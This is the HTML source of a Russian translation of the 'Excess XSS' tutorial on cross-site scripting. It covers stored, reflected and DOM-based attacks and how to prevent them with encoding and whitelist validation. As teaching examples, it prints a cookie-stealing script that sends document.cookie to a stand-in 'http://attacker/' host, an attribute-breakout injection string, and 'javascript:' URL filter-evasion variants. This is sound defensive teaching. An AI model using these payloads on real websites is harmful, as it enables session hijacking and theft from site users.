<!doctype html>
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
		<meta name="description" content="Комплексный учебник по межсайтовому скриптингу.">
		<meta name="keywords" content="XSS, excess, учебник, описание, межсайтовый скриптинг, Cross-Site Scripting">
		<title>Excess XSS: Комплексный учебник по межсайтовому скриптингу</title>
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,700,400italic,700italic">
		<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu+Mono:400,700,400italic,700italic">
		<link rel="stylesheet" href="style.css">
	</head>
	<body>
		<header>
			<h1>Excess XSS</h1>
			<p class="subtitle">Комплексный учебник по межсайтовому скриптингу</p>
			<p class="credits">Авторы <a href="https://github.com/JakobKallin" target="_blank">Jakob Kallin</a> и <a href="https://se.linkedin.com/in/irenelobovalbuena" target="_blank">Irene Lobo Valbuena</a><br><br>Перевод на русский язык <a href="https://a888r.ru" target="_blank">A888R</a></p>
		</header>
		
		<ol class="toc">
			<li><a href="#xss-overview">Обзор</a></li><!--
			--><li><a href="#xss-attacks">XSS-атака</a></li><!--
			--><li><a href="#xss-prevention">Предотвращение XSS</a></li><!--
			--><li><a href="#summary">Резюме</a></li>
		</ol>

		<h2 id="xss-overview">Часть первая: Обзор</h2>

		<h3 id="xss-definition">Что такое XSS?</h3>

		<p>Межсайтовый скриптинг (<i>англ. Cross-site scripting</i>) - это атака нацеленная на внедрение кода, позволяющая злоумышленнику выполнить вредоносный JavaScript в браузере другого пользователя.</p>

		<p>Злоумышленник не атакует свою жертву напрямую. Вместо этого он использует уязвимость веб-сайта который посещает жертва и внедряет вредоносный JavaScript код. В браузере жертвы вредоносный JavaScript отображается как легитимная часть веб-сайта, а сам веб-сайт выступает в качестве непосредственного соучастника атакующего.</p>

		<h3 id="javascript-injection">Внедрение вредоносного JavaScript кода</h3>

		<p>Единственный способ для атакующего запустить вредоносный JavaScript в браузере жертвы - это внедрить его в одну из страниц, которую загружает жертва с веб-сайта. Это возможно, если веб-сайт позволяет пользователям вводить данные на своих страницах, а атакующий сможет вставить строку, которая будет определятся как часть кода в браузере жертвы.</p>

		<p>В приведенном ниже примере показан простой серверный скрипт, который используется для отображения последнего комментария на сайте:</p>

		<p class="code">
			<code>
				print <span class="string">"&lt;html&gt;"</span><br>
				print <span class="string">"Последний комментарий:"</span><br>
				print database.latestComment<br>
				print <span class="string">"&lt;/html&gt;"</span>
			</code>
		</p>

		<p>Скрипт предполагает, что комментарий состоит только из текста. Однако, так как включен непосредственный пользовательский ввод, злоумышленник может оставить этот комментарий: "<code>&lt;script&gt;...&lt;/script&gt;</code>". Любой пользователь, посетивший страницу, теперь будет получать следующий ответ:</p>

		<p class="code">
			<code>
				<span class="html">&lt;html&gt;</span><br>
				Последний комментарий:<br>
				<strong class="malicious">&lt;script&gt;...&lt;/script&gt;</strong><br>
				<span class="html">&lt;/html&gt;</span>
			</code>
		</p>

		<p>Когда браузер пользователя загружает страницу, он будет выполнять все, в том числе JavaScript-код, содержащийся внутри тегов <code>&lt;script&gt;</code>. Атакующий успешно провел атаку.</p>

		<h3 id="malicious-javascript-definition">Что такое вредоносный JavaScript?</h3>

		<p>Возможность выполнения JavaScript в браузере жертвы может показаться не особенно вредоносной. JavaScript работает в очень ограниченной среде, которая имеет крайне ограниченный доступ к файлам пользователя и операционной системы. На самом деле, вы можете открыть консоль JavaScript в своем браузере прямо сейчас и выполнить любой JavaScript который хотите, и очень маловероятно, что вы сможете причинить какой-либо вред вашему компьютеру.</p>

		<p>Тем не менее, возможности JavaScript-кода в качестве вредоносного становятся более понятными, если учесть следующие факты:</p>

		<ul>
		<li><p>JavaScript имеет доступ к некоторой конфиденциальной информации пользователя, например куки (cookies).</p></li>
		<li><p>JavaScript может отправлять HTTP-запросы с произвольным содержанием в произвольном направлении, используя <code>XMLHttpRequest</code> и другие механизмы.</p></li>
		<li><p>JavaScript может делать произвольные изменения в HTML-коде текущей страницы с помощью методов манипулирования DOM.</p></li>
		</ul>

		<p>В случае комбинирования эти факты могут вызвать очень серьезные нарушения правил безопасности, подробности будут далее.</p>

		<h3 id="malicious-javascript-consequences">Последствия вредоносного JavaScript-кода</h3>

		<p>Кроме этого, возможность выполнить произвольный JavaScript в браузере другого пользователя позволяет злоумышленнику осуществить следующие типы атак:</p>

		<dl>
			<dt>Кража куки</dt>
			<dd><p> злоумышленник может получить доступ к куки-записям жертвы, связанным с веб-сайтом, используя <code>document.cookie</code>, отправить их на свой собственный сервер и использовать их для извлечения конфиденциальной информации, такой как идентификаторы сеансов.</p></dd>
			<dt>Кейлоггер</dt>
			<dd><p>злоумышленник может зарегистрировать слушателя событий клавиатуры, используя <code>addEventListener</code>, а затем отправить все нажатия клавиш пользователя на свой сервер, потенциально записав конфиденциальную информацию, например, пароли и номера кредитных карт.</p></dd>
			<dt>Фишинг</dt>
			<dd><p>злоумышленник может вставить поддельную форму для входа на страницу, используя манипуляции DOM, установив <code>action</code> атрибуты формы на свой собственный сервер, а затем обмануть пользователя для получения конфиденциальной информации.</p></dd>
		</dl>

		<p>Хотя эти атаки существенно различаются, все они имеют одно существенное сходство: так как злоумышленник внедряет код на страницу обслуживаемую сайтом, вредоносный JavaScript выполняется в контексте этого веб-сайта. Это означает, что он рассматривается как любой другой сценарий с этого сайта: он имеет доступ к данным жертвы для этого веб-сайта (например куки-записи) и имя хоста отображаемое в строке URL будет то же, что и у веб-сайта. Для всех целей сценарий считается законной частью веб-сайта, что позволяет ему делать всё, что может делать сам веб-сайт.</p>

		<p> Этот факт подчеркивает ключевую проблему:</p>

		<p class="important"><em>Если злоумышленник может использовать ваш веб-сайт, для выполнения произвольного JavaScript-кода в браузере других пользователей, безопасность вашего веб-сайта и его пользователей скомпрометирована.</em></p>

		<p>Чтобы подчеркнуть этот момент, некоторые примеры вредоносного скрипта в этом учебнике будут оставаться без подробностей, используя <code class="malicious">&lt;script&gt;...&lt;/script&gt;</code>. Это свидетельствует о том, что простое присутствие скрипта, внедряемого атакующим является проблемой, независимо от того, какой конкретный код сценария на самом деле выполняется.</p>

		<h2 id="xss-attacks">Часть вторая: XSS-атака</h2>

		<h3 id="xss-actors">Участники XSS-атаки</h3>

		<p>Перед тем, как подробно описать как работает атака XSS, нам необходимо определить субъектов участвующих в атаке XSS. В общем, в атаке XSS присутствует три участника: <strong>веб-сайт</strong>, <strong>жертва</strong>, и <strong>взломщик</strong>.</p>

		<ul>
			<li>
				<p><strong>Веб-сайт</strong> выдает HTML-страницы для пользователей запросивших их. В наших примерах он находится по адресу <code>http://website/</code>.</p>
				<ul>
					<li><p><strong>База данных веб-сайта</strong> является базой данных, которая хранит некоторые введенные пользователями данные на страницах сайта.</p></li>
				</ul>
			</li>
			<li>
				<p><strong>Жертва</strong> - это обычный пользователь веб-сайта, который запрашивает страницы у него с помощью своего браузера.</p>
			</li>
			<li>
				<p><strong>Атакующий</strong> - это злоумышленник, который намеревается начать атаку на жертву за счет использования XSS-уязвимости на сайте.</p>
				<ul>
					<li>
						<p><strong>Сервер взломщика</strong> - это веб-сервер под контролем злоумышленника с единственной целью - кража конфиденциальной информации жертвы. В наших примерах, он находится по адресу <code>http://attacker/</code>.</p>
					</li>
				</ul>
			</li>
		</ul>

		<h3 id="example-attack-scenario">Пример сценария атаки</h3>

		<p>В этом примере мы будем считать, что конечной целью атакующего является кража куки жертвы, эксплуатируя XSS-уязвимость веб-сайта. Это произойдет если браузер жертвы обработает следующий код:</p>

		<p class="code">
			<code>
				<span class="color-1">&lt;script&gt;</span><br>
				window.location='http://attacker/?cookie='+document.cookie<br>
				<span class="color-1">&lt;/script&gt;</span>
			</code>
		</p>

		<p>Этот скрипт создаст HTTP-запрос на другой URL-адрес, который перенаправит браузер пользователя на сервер атакующего. URL-адрес включает в себя куки жертвы в качестве параметра запроса, когда HTTP-запрос приходит на сервер атакующего, злоумышленник может извлечь эти куки из запроса. После того, как злоумышленник получил куки, - он может использовать их, чтобы выдать себя за жертву и начать последующее нападение.</p>

		<p>С этого момента, показанный выше HTML код будет называться <strong>вредоносной строкой</strong> или <strong>вредоносным скриптом</strong>. Важно понимать, что сама строка является вредоносной только если она, в конечном счете, обрабатывается как HTML-код в браузере жертвы, а это может произойти только в случае наличия XSS-уязвимости на веб-сайте.</p>

		<h4 id="example-attack-description">Как работает этот пример атаки</h4>

		<p>На схеме ниже показан пример выполнения атаки злоумышленником:</p>

		<figure class="image">
			<img src="persistent-xss.png" alt="Схема хранимой XSS-атаки">
			<figcaption>
				<ol>
					<li>
						<p>Атакующий использует одну из форм веб-сайта для того, чтобы вставить вредоносную строку в базу данных веб-сайта.</p>
					</li>
					<li>
						<p>Жертва запрашивает страницу с веб-сайта.</p>
					</li>
					<li>
						<p>Сайт включает вредоносную строку из базы данных в ответ и отправляет его к жертве.</p>
					</li>
					<li>
						<p>Браузер жертвы выполняет вредоносный сценарий внутри ответа, отправляя куки жертвы на сервер злоумышленника.</p>
					</li>
				</ol>
			</figcaption>
		</figure>

		<h3 id="xss-types">Типы XSS</h3>

		<p>Цель XSS-атаки всегда заключается в выполнении вредоносного JavaScript скрипта в браузере жертвы. Существует несколько принципиально различных способов достижения этой цели. XSS-атаки часто подразделяются на три типа:</p>
		
		<ul>
			<li>
				<p><strong>Хранимые (постоянные) XSS</strong>, где вредоносная строка берет свое начало из базы данных веб-сайта.</p>
			</li>
			<li>
				<p><strong>Отражённые (непостоянные) XSS</strong>, где вредоносная строка порождается из запроса жертвы.</p>
			</li>
			<li>
				<p><strong>DOM-модели XSS</strong>, где уязвимость возникает в коде на стороне клиента, а не на стороне серверного кода.</p>
			</li>
		</ul>

		<p>В предыдущем примере показана хранимая XSS-атака. Теперь мы опишем два других типа XSS-атак: отраженный XSS и XSS-атака DOM-модели.</p>

		<h4 id="reflected-xss">Отражённый XSS</h4>

		<p>В случае отраженной XSS-атаки вредоносная строка является частью запроса жертвы к веб-сайту. Сайт принимает и вставляет эту вредоносную строку в отправляемый ответ обратно пользователю. Схема ниже иллюстрирует этот сценарий:</p>

		<figure class="image">
			<img src="reflected-xss.png" alt="Схема отраженной XSS-атаки">
			<figcaption>
				<ol>
					<li><p>Атакующий создает URL-адрес, содержащий вредоносную строку, и отправляет его жертве.</p></li>
					<li><p> Жертва обманным путем атакующего отправляет URL-запрос на веб-сайт.</p></li>
					<li><p>Сайт включает вредоносную строку из URL-запроса в ответ жертве.</p></li>
					<li><p>Браузер жертвы выполняет вредоносный сценарий, содержащийся в ответе, посылая куки жертвы на сервер злоумышленника.</p></li>
				</ol>
			</figcaption>
		</figure>

		<h5 id="reflected-xss-viability">Как успешно провести отраженную XSS-атаку?</h5>

		<p>Отраженная XSS-атака может показаться безобидной, поскольку она требует чтобы жертва от своего имени отправила запрос, содержащий вредоносную строку. Так как никто не будет добровольно атаковать себя, то кажется, что не существует способа фактического выполнения атаки.</p>

		<p>Как выясняется, есть по крайней мере два распространенных способа заставить жертву начать отраженную XSS-атаку против себя:</p>

		<ul>
		<li><p>Если пользователь является конкретной личностью, злоумышленник может отправить вредоносную URL-ссылку жертве (например с помощью электронной почты или мессенджера), и обманом заставить его открыть ссылку для посещения веб-сайта.</p></li>
		<li><p>Если цель - это большая группа пользователей, злоумышленник может опубликовать ссылку на вредоносный URL (например на своем собственном веб-сайте или в социальной сети) и ждать посетителей которые перейдут по ссылке.</p></li>
		</ul>

		<p>Оба эти метода похожи, и оба они могут быть более успешными с использованием  служб позволяющих "укоротить" URL-адрес, они замаскируют вредоносную строку от пользователей, которые могли бы идентифицировать ее.</p>

		<h4 id="dom-based-xss">XSS в DOM-модели</h4>

		<p>XSS в DOM-модели представляет собой вариант как хранимой и отраженной XSS-атаки.В этой XSS-атаке вредоносная строка не обрабатывается браузером жертвы, пока настоящий JavaScript веб-сайта не выполнится. Схема ниже иллюстрирует этот сценарий для отраженной XSS-атаки:</p>

		<figure class="image">
			<img src="dom-based-xss.png" alt="Схема XSS-атаки в DOM-модели">
			<figcaption>
				<ol>
					<li><p>Атакующий создадет URL-адрес, содержащий вредоносную строку, и отправляет его жертве.</p></li>
					<li><p>Жертва обманным путем атакующего отправляет URL-запрос к веб-сайту.</p></li>
					<li><p>Сайт принимает запрос, но не включает в ответ вредоносную строку.</p></li>
					<li><p>Браузер жертвы выполняет легитимный сценарий, содержащийся в ответе, в результате чего вредоносный скрипт будет вставлен в страницу.</p></li>
					<li><p>Браузер жертвы выполняет вредоносный скрипт, вставленный в страницу, посылая куки жертвы на сервер злоумышленника.</p></li>
				</ol>
			</figcaption>
		</figure>

		<h5 id="dom-based-xss-difference">В чем отличие XSS в DOM-модели?</h5>

		<p>В предыдущих примерах хранимых и отраженных XSS-атак сервер вставляет вредоносный скрипт на страницу, которая затем пересылается в ответе к жертве. Когда браузер жертвы получил ответ, он предполагает, что вредоносный скрипт является частью легитимного содержания страницы, и автоматически выполняет его во время загрузки страницы, как и любой другой сценарий.</p>

		<p>В примере XSS-атаки в DOM-модели вредоносный скрипт не вставляется как часть страницы; единственный скрипт, который автоматически выполняется во время загрузки страницы является легитимной частью страницы. Проблема заключается в том, что этот легитимный сценарий напрямую использует пользовательский ввод для того, чтобы добавить HTML на страницу. Поскольку вредоносная строка вставляется в страницу с помощью <code>innerHTML</code>, она анализируется как HTML, в результате чего вредоносный скрипт будет выполняться.</p>

		<p>Это различие небольшое, но очень важное:</p>

		<ul>
		<li><p>В традиционном XSS вредоносный JavaScript выполняется при загрузке страницы, как часть HTML, отправленного сервером.</p></li>
		<li><p>В случае XSS в DOM-модели вредоносный JavaScript выполняется после загрузки страницы, в результате эта страница с легитимным JavaScript обращается небезопасным способом к пользовательскому вводу (содержащему вредоносную строку).</p></li>
		</ul>


		<h5 id="dom-based-xss-significance">Как работает XSS в DOM-модели?</h5>

		<p>В предыдущем примере нет необходимости в JavaScript; сервер может генерировать все HTML сам по себе. Если код на стороне сервера не содержал бы уязвимостей, веб-сайт не был бы подвержен уязвимости XSS.</p>

		<p>Однако, так как веб-приложения становятся более продвинутыми, все большее количество HTML-страниц генерируется с помощью JavaScript на стороне клиента, а не на сервере. В любое время контент должен изменятся без обновления всей страницы, это возможно с использованием JavaScript. В частности, это тот случай, когда страница обновляется после AJAX запроса.</p>

		<p>Это означает, что XSS уязвимости могут присутствовать не только в серверной части кода вашего сайта, но и на стороне JavaScript-кода  клиента вашего сайта. Следовательно, даже при полностью безопасном коде на стороне сервера, - клиентский код может все еще не безопасно включать ввод пользовательских данных при обновлении DOM после загрузки страницы. Если это произойдет, то код со стороны клиента позволит провести XSS-атаку не по вине кода со стороны сервера.</p>

		<h4 id="dom-based-xss-invisible-to-server">XSS на основе DOM-модели может быть невидим для сервера</h4>

		<p>Существует особый случай XSS-атаки в DOM-модели, в котором вредоносная строка никогда не отправляется на сервер веб-сайта: это происходит тогда, когда вредоносная строка содержится в фрагменте идентификатора URL-адреса (что-либо после символа <code>#</code>). Браузеры не отправляют эту часть URL-адреса на сервер, так что веб-сайт не имеет доступа к нему с помощью кода на стороне сервера. Код со стороны клиента, однако, имеет доступ к нему, и, таким образом, возможно проведение XSS-атаки путем небезопасной обработки.</p>

		<p>Этот случай не ограничивается идентификатором фрагмента. Существует и другой пользовательский ввод, который является невидимым для сервера, например, новые функции HTML5, такие как LocalStorage и IndexedDB.</p>

		<h2 id="xss-prevention">Часть третья:<br>Предотвращение XSS</h2>

		<h3 id="xss-prevention-methods">Методы предотвращения XSS</h3>

		<p>Напомним, что XSS является атакой типа внедрения кода: введенные данные пользователем ошибочно интерпретируются как вредоносный программный код. Для того, чтобы не допустить этого типа инъекции кода, требуется безопасная обработка ввода. Для веб-разработчика, существует два принципиально различных способа выполнения безопасной обработки ввода:</p>

		<ul>
		<li><p><strong>Кодирование</strong> — это способ который позволяет произвести ввод данных пользователем только как данные и не позволяет браузеру обработку как кода.</p></li>
		<li><p><strong>Валидация</strong> — это способ фильтрует пользовательский ввод так, что браузер интерпретирует его как код без вредоносных команд.</p></li>
		</ul>


		<p>Хотя это принципиально разные методы предотвращения XSS, они имеют несколько общих черт, которые являются важными для понимания при использовании любого из них:</p>

		<dl>
		<dt>Контекст</dt>
		<dd><p>Безопасная обработка ввода должна быть выполнена по-разному в зависимости от того, где на странице используется пользовательский ввод.</p></dd>
		<dt>входящий/исходящий</dt>
		<dd><p>Безопасная обработка ввода может быть выполнена либо, когда ваш сайт получает входные данные (входящий трафик) или прямо перед тем, как сайт вставляет пользовательский ввод в содержимое страницы (исходящий).</p></dd>
		<dt>Клиент/Сервер</dt>
		<dd><p>Безопасная обработка ввода может быть выполнена либо на стороне клиента, либо на стороне сервера, каждый вариант необходим при различных обстоятельствах.</p></dd>
		</dl>


		<p>Прежде чем объяснять в деталях как работает кодирование и валидация мы опишем каждый из этих пунктов.</p>

		<h4 id="input-handling-contexts">Обработка пользовательского ввода в контекстах</h4>

		<p>Есть много контекстов на веб-странице, где может быть применен пользовательский ввод. Для каждого из них должны быть соблюдены особые правила для того, чтобы пользовательский ввод не мог «вырваться» из своего контекста и не мог быть интерпретирован как вредоносный код. Ниже приведены наиболее распространенные контексты: </p>

		<figure>
			<table>
				<thead>
					<tr>
						<th>Контекст</th>
						<th>Пример кода</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td>Контент в виде HTML элемента</td>
						<td><code>&lt;div&gt;<var class="input">userInput</var>&lt;/div&gt;</code></td>
					</tr>
					<tr>
						<td>Атрибуты значений в HTML</td>
						<td><code>&lt;input value="<var class="input">userInput</var>"&gt;</code></td>
					</tr>
					<tr>
						<td>Значения в URL-запросе</td>
						<td><code>http://example.com/?parameter=<var class="input">userInput</var></code></td>
					</tr>
					<tr>
						<td>Значения с CSS</td>
						<td><code>color: <var class="input">userInput</var></code></td>
					</tr>
					<tr>
						<td>Значения в JavaScript</td>
						<td><code>var name = "<var class="input">userInput</var>";</code></td>
					</tr>
				</tbody>
			</table>
		</figure>

		<h5 id="context-significance">Какое значение имеют контексты?</h5>

		<p>Во всех описанных контекстах уязвимость приводящая к XSS может возникнуть если вводимые пользователем данные были вставлены до первого кодирования или валидации. Злоумышленник может внедрить вредоносный код просто вставив закрывающий разделитель для этого контекста и следом за ним вредоносный код.</p>

		<p>Например, если в какой-то момент веб-сайт включает ввод данных пользователем непосредственно в атрибут HTML, злоумышленник сможет внедрить вредоносный сценарий, начав свой ввод с кавычки, как показано ниже:</p>

		<figure>
			<table>
				<tbody>
					<tr>
						<th>Код приложения</th>
						<td><code>&lt;input value="<var class="input">userInput</var>"&gt;</code></td>
					</tr>
					<tr>
						<th>Вредоносная строка</th>
						<td><code class="malicious">"&gt;&lt;script&gt;...&lt;/script&gt;&lt;input value="</code></td>
					</tr>
					<tr>
						<th>Конечный код</th>
						<td><code>&lt;input value="<strong class="malicious">"&gt;&lt;script&gt;...&lt;/script&gt;&lt;input value="</strong>"&gt;</code></td>
					</tr>
				</tbody>
			</table>
		</figure>

		<p>Это можно было бы предотвратить, просто удалив все кавычки в пользовательском вводе, и все было бы хорошо, но только в этом контексте. Если же ввод был вставлен в другой контекст, закрывающий разделитель будет отличаться и инъекция станет возможной. По этой причине, безопасная обработка ввода всегда должна быть адаптирована к контексту, где будет вставлен пользовательский ввод.</p>

		<h4 id="inbound-outbound-input-handling">Обработка входящего/исходящего пользовательского ввода</h4>

		<p>Инстинктивно, может показаться, что XSS можно предотвратить с помощью кодирования или валидации всего пользовательского ввода, как только наш сайт получает его. Таким образом, любые вредоносные строки уже будут нейтрализованы всякий раз, когда они будут включатся в страницу, и скриптам генерации HTML не придется заботиться о безопасной обработке пользовательского ввода.</p>

		<p>Проблема состоит в том, что как было описано ранее, вводимые пользователем данные могут быть вставлены в несколько контекстов на странице. И нет простого способа определить, когда пользовательский ввод приходит в контекст - как он в конечном итоге будет вставлен, и тот же пользовательский ввод часто должен быть вставлен в различных контекстах. Опираясь на обработку входящего ввода для предотвращения XSS, мы создаем очень хрупкое решение, которое будет подвержено ошибкам. (Устаревшие "<a href="http://php.net/manual/en/security.magicquotes.php">волшебные кавычки</a>" PHP являются примером такого решения.)</p>

		<p>Вместо этого, обработка исходящего ввода должна быть вашей основной линией защиты от XSS, потому что он может принимать во внимание конкретный контекст, какие вводимые пользователем данные будут вставлены. В какой то степени, входящую валидацию можно использовать для добавления вторичного слоя защиты, но об этом позже.</p>

		<h4 id="input-handling-location">Где возможно выполнять безопасную обработку пользовательского ввода</h4>

		<p>В большинстве современных веб-приложений, пользовательский ввод обрабатывается как на стороне серверного кода, так и на стороне  кода клиента. В целях защиты от всех типов XSS, безопасная обработка ввода должна быть выполнена как в коде на стороне сервера, так и на стороне кода клиента.</p>

		<ul>
		<li><p>В целях защиты от традиционных XSS, безопасная обработка ввода должна быть выполнена в коде на стороне сервера. Это делается с помощью какого-либо языка, поддерживаемого сервером.</p></li>
		<li><p>В целях защиты от XSS-атаки в DOM-модели, где сервер никогда не получает вредоносную строку (например, описанная ранее <a href="#dom-based-xss-invisible-to-server">атака через фрагмент идентификатора</a>), безопасная обработка ввода должна быть выполнена в коде на стороне клиента. Это делается с помощью JavaScript.</p></li>
		</ul>


		<p>Теперь, когда мы объяснили, почему контекст имеет значение, почему различие между входящей и исходящей обработкой ввода имеет важное значение, и почему безопасная обработка ввода должна быть выполнена с обеих сторон, и на стороне клиента и на стороне сервера, мы можем продолжить чтобы объяснить, каким образом два типа безопасной обработки ввода (кодирование и валидация) выполняются фактически.</p>


		<h3 id="encoding">Кодирование</h3>

		<p>Кодирование является способом выхода из ситуации когда необходимо что бы пользовательский ввод данных браузер интерпретировал только как данные, а не код. Самый популярный тип кодирования в веб-разработке, это маскирование HTML, который преобразует символы, такие как <strong><code>&lt;</code></strong> и <strong><code>&gt;</code></strong> в <strong><code>&amp;lt;</code></strong> и <strong><code>&amp;gt;</code></strong> соответственно.</p>

		<p>Следующий псевдокод является примером того, как вводимые пользователем данные (пользовательский ввод) могут быть закодированы с использованием HTML маскирования и затем вставлены в страницу с помощью серверного сценария:</p>

		<p class="code">
			<code>
				print <span class="string">"&lt;html&gt;"</span><br>
				print <span class="string">"Последний комментарий: "</span><br>
				print encodeHtml(userInput)<br>
				print <span class="string">"&lt;/html&gt;"</span>
			</code>
		</p>

		<p>Если пользователь введет следующую строку <code class="malicious">&lt;script&gt;...&lt;/script&gt;</code>, результирующий HTML будет выглядеть следующим образом:</p>

		<p class="code">
			<code>
				<span class="html">&lt;html&gt;</span><br>
				Последний комментарий:<br>
				<strong class="safe">&amp;lt;script&amp;gt;...&amp;lt;/script&amp;gt;</strong><br>
				<span class="html">&lt;/html&gt;</span>
			</code>
		</p>

		<p>Потому что все символы со специальным значением были замаскированны, браузер не будет разбирать какую-либо часть пользовательского ввода, как HTML.</p>

		<h4 id="encoding-location">Кодирование кода на стороне клиента и сервера</h4>

		<p>При выполнении кодирования кода со стороны клиента, всегда используется язык JavaScript, который имеет встроенные функции которые кодируют данные для разных контекстов.</p>

		<p>При выполнении кодирования в вашем коде на стороне сервера, вы полагаетесь на функции доступные в вашем языке или фреймворке. Из-за большого количества языков и доступных фреймворков, данное учебное пособие не будет охватывать детали кодирования в каком-либо конкретном языке сервера или фреймворка. Тем не менее функции кодирования JavaScript используемые на стороне клиента также используются при написании кода на стороне сервера.</p>

		<h5 id="client-side-encoding">Кодирование на стороне клиента</h5>

		<p>При кодировании пользовательского ввода на стороне клиента с помощью JavaScript есть несколько встроенных методов и свойств, которые автоматически кодируют все данные в контекстно-зависимый стиль:</p>

		<figure>
			<table>
				<thead>
					<tr>
						<th>Контекст</th>
						<th>Метод/свойство</th>
					</tr>
				</thead>
				<tbody>
					<tr>
						<td>Контент в виде HTML элемента</td>
						<td><code><var>node</var>.textContent = <var class="input">userInput</var></code></td>
					</tr>
					<tr>
						<td>Атрибуты значений в HTML</td>
						<td><code><var>element</var>.setAttribute(<var>attribute</var>, <var class="input">userInput</var>)</code><br>or<br><code><var>element</var>[<var>attribute</var>] = <var class="input">userInput</var></code></td>
					</tr>
					<tr>
						<td>Значения в URL-запросе</td>
						<td><code>window.encodeURIComponent(<var class="input">userInput</var>)</code></td>
					</tr>
					<tr>
						<td>Значения с CSS</td>
						<td><code><var>element</var>.style.<var>property</var> = <var class="input">userInput</var></code></td>
					</tr>
				</tbody>
			</table>
		</figure>

		<p>Последний контекст уже упоминавшийся выше (значения в JavaScript) не входит в этот список, потому что JavaScript не предоставляет встроенный способ кодирования данных, который будет включен в исходный код JavaScript.</p>

		<h4 id="encoding-limitations">Ограничения кодирования</h4>

		<p>Даже при кодировании возможно использование злонамеренных строк в некоторых контекстах. Ярким примером этого является то, когда пользовательский ввод используется для предоставления URL-адреса, например, в приведенном ниже примере:</p>

		<p class="code"><code>document.querySelector('a').href = <var class="input">userInput</var></code></p>

		<p>Хотя указанное значение в свойстве элемента <code>href</code> автоматически кодирует его так, что он становится не более, чем значение атрибута, это само по себе не мешает злоумышленнику вставить URL, начинающийся с "<code class="malicious">javascript:</code>". При щелчке по ссылке, независимо от построения, встроенный JavaScript внутри URL будет выполнен.</p>

		<p>Кодирование также не эффективное решение, когда вы хотите чтобы пользователи могли использовать часть HTML-кодов на странице. Примером может служить страница профиля пользователя, где пользователь может использовать пользовательский HTML. Если этот обычный HTML будет закодирован, страница профиля сможет состоять только из простого текста.</p11>

		<p>В подобных ситуациях, кодирование должно быть дополнено валидацией, с которой мы познакомимся далее.</p>

		<h3 id="validation">Валидация</h3>

		<p>Валидация является актом фильтрации пользовательского ввода таким образом, чтобы все вредоносные его части были удалены, без необходимости удаления всего кода в нем. Один из самых используемых видов проверки в веб-разработке позволяет использовать некоторые HTML-элементы (например, <code>&lt;em&gt;</code> и <code>&lt;strong&gt;</code>) но запретив другие (например, <code>&lt;script&gt;</code>).</p>

		<p>Существуют две основные характерные проверки, которые различаются своими реализациями:</p>

		<dl>
		<dt>Стратегия классификации</dt>
		<dd><p>Пользовательский ввод может быть классифицирован с использованием черных либо и белых списков.</p></dd>
		<dt>Результат валидации</dt>
		<dd><p>Пользовательский ввод идентифицированный как вредоносный может быть отклонен или продезинфицирован.</p></dd>
		</dl>


		<h4 id="classification-strategy">Стратегия классификации</h4>

		<h5 id="blacklisting">Черный список</h5>

		<p>Инстинктивно, представляется целесообразным выполнить проверку путем определения запрещенного шаблона, который не должен появляться в пользовательском вводе. Если строка соответствует этому шаблону, она помечается как недействительная. Например позволить пользователям отправлять пользовательские URL-адреса с любым протоколом, за исключением <code>javascript:</code>. Эта стратегия классификации называется <em>черный список</em>.</p>

		<p>Тем не менее, черный список имеет два основных недостатка:</p>

		<dl>
		<dt>Сложность</dt>
		<dd><p>точно описывать множество всех возможных вредоносных строк, как правило, очень сложная задача. Пример политики описанный выше, не может быть успешно реализован путем простого поиска по подстроке "<code>javascript</code>", потому что ему будет не хватать строки вида "<code>Javascript:</code>" (где первая буква в верхнем регистре) и "<code>&amp;#106;avascript:</code>" (где первая буква кодируется как числовая ссылка на символ).</p></dd>
		<dt>Устаривание</dt>
		<dd><p>Даже если идеальный черный список был бы разработан, он окажется бесполезным если новую функцию добавленную в браузер будет возможно использовать для атаки. Например, если черный список для валидации HTML был разработан до введения в HTML5 атрибута <code>onmousewheel</code> он (черный список) не сможет остановить злоумышленника который будет использовать этот атрибут для выполнения XSS-атаки. Этот недостаток особенно важен в веб-разработке, которая состоит из множества различных технологий, которые постоянно обновляются.</p></dd>
		</dl>

		<p>Из-за этих недостатков черный список настоятельно не рекомендуется как стратегия классификации. Белый список, как правило, гораздо более безопасный подход, который мы опишем далее.</p>

		<h5 id="whitelisting">Белый список</h5>

		<p><em>Белый список</em> по существу противоположен черному списку: вместо того, чтобы определять запрещенный шаблон, подход белого списка определяет разрешенный шаблон и отмечает ввод недействительным если он <em>не соответствует</em> этому шаблону.</p>
		
		<p>В отличие от черных списков, примером белых списков было бы разрешить пользователям отправлять пользовательские URL-адреса, содержащие только протоколы <code>http:</code> и <code>https:</code>, ничего более. Такой подход позволил бы автоматически пометить что URL-адрес является недействительным, если он содержит протокол <code>javascript:</code>, даже если он представлен как "<code>Javascript:</code>" или "<code>&amp;#106;avascript:</code>".</p>

		<p>По сравнению с черным списком у белых списков есть два основных преимущества:</p>

		<dl>
		<dt>Простота</dt>
		<dd><p>Точно описывать набор безопасных строк, как правило, намного проще, чем идентифицировать набор всех вредоносных строк. Это особенно применимо в общих ситуациях, когда пользовательский ввод должен включать в себя очень ограниченный набор функциональных возможностей доступных в браузере. Например, белый список описанный выше очень просто позволяет использовать URL-адреса только с разрешенными протоколами <code>http:</code> или <code>https:</code>, и в большинстве ситуаций этого вполне достаточно для пользователей.</dd>
		<dt>Долговечность</dt>
		<dd><p>В отличие от черного списка, белый список, как правило, не становятся устаревшими, когда новая функция добавляется в браузер. Например, HTML валидация белым списком позволяет только <code>title</code> атрибутам HTML-элементов оставаться безопасными, даже если он (белый список) был разработан до введения <code>onmousewheel</code> атрибута HTML5.</p></dd>
		</dl>


		<h4 id="validation-outcome">Результат валидации</h4>

		<p>Когда пользовательский ввод был отмечен как недействительный (запрещенный), может быть принято одно из двух действий:</p>

		<dl>
		<dt>Отклонение</dt>
		<dd><p>ввод просто отклоняется, предотвращая его использование в других местах на сайте.</p></dd>
		<dt>Дезинфекция</dt>
		<dd><p>все недействительные части вводимых данных удаляются, а оставшийся ввод используется на веб-сайте как обычно.</p></dd>
		</dl>

		<p>Из этих двух, "отклонение" является самым простым подходом в реализации. Но считается, что дезинфекция является более полезной, поскольку она предоставляет более широкий диапазон ввода для пользователя. Например, если пользователь отправляет номер кредитной карты, дезинфекция удалит все символы не являющиеся символами и предотвратит инъекцию кода, а также позволяет пользователю ввести номер как содержащий дефисы, так и без них.</p>

